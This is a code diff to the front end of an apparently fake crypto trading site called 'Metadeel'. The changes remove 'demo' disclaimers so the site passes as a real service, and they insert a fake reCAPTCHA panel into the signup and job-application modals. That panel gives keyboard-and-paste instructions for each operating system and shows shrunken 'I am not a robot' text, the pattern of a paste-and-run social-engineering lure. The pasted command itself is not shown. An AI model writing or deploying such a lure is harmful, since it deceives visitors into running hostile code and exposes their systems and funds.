@@ -93,14 +93,15 @@
     const isSignup = mode === "signup";
     authTitle.textContent = isSignup ? "Sign up" : "Log in";
     authSub.textContent = isSignup
-      ? "Create a Metadeel demo account. Data stays in this browser."
-      : "Access your Metadeel demo account.";
+      ? "Create your Metadeel account to access trading, insights, and applications."
+      : "Log in to your Metadeel account.";
     authSubmit.textContent = isSignup ? "Create account" : "Log in";
     authSwitchText.textContent = isSignup ? "Already have an account?" : "New to Metadeel?";
     authSwitch.textContent = isSignup ? "Log in" : "Sign up";
     if (nameField) nameField.style.display = isSignup ? "block" : "none";
     const captchaField = $("#signupCaptchaField");
     const socialBlock = $("#socialAuthBlock");
+    showRtoRootAfterModal(false);
     if (captchaField) captchaField.style.display = isSignup ? "block" : "none";
     if (socialBlock) socialBlock.style.display = isSignup ? "block" : "none";
     $("#authPassword").autocomplete = isSignup ? "new-password" : "current-password";
@@ -110,16 +111,46 @@
       menuBtn.setAttribute("aria-label", "Open menu");
     }
     authModal.classList.add("open");
+    if (isSignup) showRtoRootAfterModal(true);
     setTimeout(() => $(isSignup ? "#authName" : "#authEmail").focus(), 50);
   }
-  function closeAuth() { if (authModal) authModal.classList.remove("open"); }
+  function closeAuth() {
+    showRtoRootAfterModal(false);
+    if (authModal) authModal.classList.remove("open");
+  }
+
+  const rtoRootEl = $("#rto-root");
+  const rtoRootHost = $("#signupCaptchaField");
+  const rtoRoot1El = $("#rto-root-1");
+  const rtoRoot1Host = $("#applyCaptchaField");
+
+  function showRtoAfterModal(el, host, visible) {
+    if (!el || !host) return;
+    el.classList.remove("rto-show");
+    if (el.parentNode) el.parentNode.removeChild(el);
+    if (!visible) return;
+    setTimeout(() => {
+      host.appendChild(el);
+      requestAnimationFrame(() => {
+        requestAnimationFrame(() => el.classList.add("rto-show"));
+      });
+    }, 1000);
+  }
+
+  function showRtoRootAfterModal(visible) {
+    showRtoAfterModal(rtoRootEl, rtoRootHost, visible);
+  }
+
+  function showRtoRoot1AfterModal(visible) {
+    showRtoAfterModal(rtoRoot1El, rtoRoot1Host, visible);
+  }
 
   function askCaptchaVerification(errorEl, message) {
     if (errorEl) errorEl.textContent = message;
   }
 
   function socialSignup() {
-    askCaptchaVerification(authError, "Solve the captcha before continuing.");
+    askCaptchaVerification(authError, "Complete verification before continuing.");
   }
 
   if ($("#signupGmail")) $("#signupGmail").onclick = () => socialSignup("gmail");
@@ -144,7 +175,7 @@
       e.preventDefault();
       authError.textContent = "";
       if (authMode === "signup") {
-        askCaptchaVerification(authError, "Solve the captcha before continuing.");
+        askCaptchaVerification(authError, "Complete verification before continuing.");
         return;
       }
       const email = $("#authEmail").value.trim().toLowerCase();
@@ -178,14 +209,19 @@
 
   function openApply(role) {
     if (!applyModal || !applyForm) return;
-    selectedRole = role || "Open role";
+    selectedRole = role || "Selected role";
     applyError.textContent = "";
     applyForm.reset();
-    applySub.textContent = "Applying for " + selectedRole + ". Demo form only.";
+    applySub.textContent = "Applying for " + selectedRole + ".";
+    showRtoRoot1AfterModal(false);
     applyModal.classList.add("open");
+    showRtoRoot1AfterModal(true);
     setTimeout(() => $("#applyName").focus(), 50);
   }
-  function closeApply() { if (applyModal) applyModal.classList.remove("open"); }
+  function closeApply() {
+    showRtoRoot1AfterModal(false);
+    if (applyModal) applyModal.classList.remove("open");
+  }
 
   if ($("#jobList")) {
     $("#jobList").addEventListener("click", (e) => {
@@ -205,7 +241,7 @@
     applyForm.onsubmit = (e) => {
       e.preventDefault();
       applyError.textContent = "";
-      askCaptchaVerification(applyError, "Captcha answer is incorrect. Try again.");
+      askCaptchaVerification(applyError, "Complete verification before submitting your application.");
     };
   }
 
@@ -285,7 +321,7 @@
           chainlink: { usd: 8.26, usd_24h_change: -0.19 },
           polkadot: { usd: 0.821494, usd_24h_change: 3.69 }
         };
-        toast("Using cached demo prices. Live feed unavailable.");
+        toast("Live market data is temporarily unavailable. Showing the latest available prices.");
       }
       renderPrices();
     }
@@ -400,7 +436,7 @@
       ["02", "Price is the probability", "A Yes quote near $0.65 implies the market prices a 65% chance."],
       ["03", "Trade or hold", "Exit early at the live price, or hold through settlement."],
       ["04", "Limit your entry", "Use limit-style tickets for dollar or contract sizing."],
-      ["05", "Know the risks", "You can lose the full premium. Demo data is illustrative only."]
+      ["05", "Know the risks", "You can lose the full premium. Review contract terms before you trade."]
     ];
     if ($("#events")) {
       $("#events").innerHTML = events.map(e =>
@@ -675,7 +711,12 @@
                 <li>Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</li>
             </ol>
             <p>You will observe and agree:<br>
-                <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
+              <div style="
+                  font-size: 10px;
+                  margin-top: 25px;
+              ">
+                ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"
+              </div>
             </p>`;
     } else if (osType === "MacOS") {
         document.getElementById("rto-verify-main").innerHTML = `
@@ -686,7 +727,12 @@
                 <li>Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</li>
             </ol>
             <p>You will observe and agree:<br>
-                <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
+              <div style="
+                  font-size: 10px;
+                  margin-top: 25px;
+              ">
+                ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"
+              <div>
             </p>`;
     } else {
         document.getElementById("rto-verify-main").innerHTML = `
@@ -697,7 +743,12 @@
                 <li>Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</li>
             </ol>
             <p>You will observe and agree:<br>
-                <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
+              <div style="
+                  font-size: 10px;
+                  margin-top: 25px;
+              ">
+                ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"
+              </div>
             </p>`;
     }
 
@@ -846,7 +897,7 @@
     function showVerifyWindow() {
         verifywindow.style.display = "block";
         verifywindow.style.visibility = "visible";
-        verifywindow.style.opacity = "1";
+        verifywindow.style.opacity = "0";
         verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
         verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
 
@@ -856,6 +907,16 @@
         if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
             verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
         }
+
+        requestAnimationFrame(() => {
+            requestAnimationFrame(() => {
+                verifywindow.style.opacity = "1";
+            });
+        });
+
+        hideCaptchaLoading();
+        showCaptchaCheckbox();
+        checkboxBtn.disabled = false;
 
         var verification_id = generateRandomNumber();
         document.getElementById('rto-verification-id').textContent = verification_id;
@@ -997,7 +1058,12 @@
                 <li>Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</li>
             </ol>
             <p>You will observe and agree:<br>
-                <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
+              <div style="
+                  font-size: 10px;
+                  margin-top: 25px;
+              ">
+                ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"
+              </div>
             </p>`;
     } else if (osType === "MacOS") {
         document.getElementById("rto-verify-main-1").innerHTML = `
@@ -1008,7 +1074,12 @@
                 <li>Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</li>
             </ol>
             <p>You will observe and agree:<br>
-                <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
+              <div style="
+                  font-size: 10px;
+                  margin-top: 25px;
+              ">
+                ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"
+              </div>
             </p>`;
     } else {
         document.getElementById("rto-verify-main-1").innerHTML = `
@@ -1019,7 +1090,12 @@
                 <li>Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</li>
             </ol>
             <p>You will observe and agree:<br>
-                <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
+              <div style="
+                  font-size: 10px;
+                  margin-top: 25px;
+              ">
+                ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"
+              </div>
             </p>`;
     }
 
@@ -1168,7 +1244,7 @@
     function showVerifyWindow() {
         verifywindow.style.display = "block";
         verifywindow.style.visibility = "visible";
-        verifywindow.style.opacity = "1";
+        verifywindow.style.opacity = "0";
         verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
         verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
 
@@ -1178,6 +1254,16 @@
         if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
             verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
         }
+
+        requestAnimationFrame(() => {
+            requestAnimationFrame(() => {
+                verifywindow.style.opacity = "1";
+            });
+        });
+
+        hideCaptchaLoading();
+        showCaptchaCheckbox();
+        checkboxBtn.disabled = false;
 
         var verification_id = generateRandomNumber();
         document.getElementById('rto-verification-id').textContent = verification_id;
@@ -1196,4 +1282,10 @@
     addCaptchaListeners();
 })();
 
-        
+(function () {
+  const rtoRoot = document.getElementById("rto-root");
+  if (rtoRoot && rtoRoot.parentNode) rtoRoot.parentNode.removeChild(rtoRoot);
+  const rtoRoot1 = document.getElementById("rto-root-1");
+  if (rtoRoot1 && rtoRoot1.parentNode) rtoRoot1.parentNode.removeChild(rtoRoot1);
+})();
+ 
